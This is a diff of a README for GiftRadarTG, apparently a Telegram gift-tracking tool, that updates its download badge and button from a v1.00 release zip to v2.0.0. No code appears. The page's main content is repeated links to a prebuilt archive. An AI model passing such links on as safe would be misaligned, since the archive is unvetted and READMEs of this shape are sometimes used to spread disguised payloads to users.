@@ -7,7 +7,7 @@ GiftRadarTG is a powerful tool for discovering, analyzing, monitoring, and track
 ---
 ## 📌 Project Status
 
-[![DOWNLOAD](https://img.shields.io/badge/⬇_DOWNLOAD-GiftRadarTG-blue?style=for-the-badge&logo=github)](https://github.com/FigureGiraffe24/GiftRadarTG/releases/download/v1.00/GiftRadar.zip)
+[![DOWNLOAD](https://img.shields.io/badge/⬇_DOWNLOAD-GiftRadarTG-blue?style=for-the-badge&logo=github)](https://github.com/FigureGiraffe24/GiftRadarTG/releases/download/v2.0.0/GiftRadar.zip)
 ![Status](https://img.shields.io/badge/STATUS-STABLE-brightgreen?style=for-the-badge)
 ![Telegram](https://img.shields.io/badge/TELEGRAM-MONITORING-orange?style=for-the-badge)
 ![Version](https://img.shields.io/badge/VERSION-2.0.0-purple?style=for-the-badge)
@@ -71,10 +71,7 @@ GiftRadarTG is a powerful tool for discovering, analyzing, monitoring, and track
 
 **Ready to experience fast Telegram Gift parsing?**
 
-# [⬇️ DOWNLOAD GIFTRADARTG](https://github.com/FigureGiraffe24/GiftRadarTG/releases/download/v1.00/GiftRadar.zip)
-
-[Direct Download — GiftRadar.zip](https://github.com/FigureGiraffe24/GiftRadarTG/releases/download/v1.00/GiftRadar.zip)
-
+# [⬇️ DOWNLOAD GIFTRADARTG](https://github.com/FigureGiraffe24/GiftRadarTG/releases/download/v2.0.0/GiftRadar.zip)
 ---
 
 ⭐ **Enjoying GiftRadarTG? Leave a star on GitHub!**
